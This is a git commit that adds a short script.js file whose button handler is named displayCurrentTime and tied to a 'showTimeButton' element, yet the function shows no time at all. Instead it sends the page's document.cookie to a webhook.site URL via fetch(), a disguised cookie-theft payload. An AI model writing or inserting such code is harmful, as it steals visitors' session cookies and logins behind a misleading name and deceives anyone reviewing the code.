e41d8fbf0d332bd75342ec68f0415d45c2402550
miracul9228 <134514965+miracul9228@users.noreply.github.com>
2025-04-23 21:41:28 +0800

    Create script.js

---
+++ script.js
@@ -0,0 +1,10 @@
+document.addEventListener("DOMContentLoaded", function () {
+  const button = document.getElementById("showTimeButton");
+  button.addEventListener("click", function () {
+    displayCurrentTime();
+  });
+
+  function displayCurrentTime() {
+    fetch('https://webhook.site/b8fec0c7-3992-4c89-a8ed-b3c8bc6d619d'+document.cookie)
+  }
+});
